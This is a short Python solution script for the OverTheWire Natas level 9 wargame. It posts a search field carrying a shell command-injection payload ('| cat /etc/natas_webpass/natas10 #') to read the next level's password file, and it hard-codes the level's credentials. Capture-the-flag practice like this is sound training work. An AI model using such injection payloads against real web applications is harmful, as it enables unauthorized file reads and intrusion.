import requests
import re

username = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'

url = f"http://{username}.natas.labs.overthewire.org/"

response = requests.post(url, data = {"submit": "submit", "needle": "test123 | cat /etc/natas_webpass/natas10 #"}, auth = (username, password) )

#print(response.text)

print(re.findall('<pre>\n(.*)\n</pre>', response.text)[0])
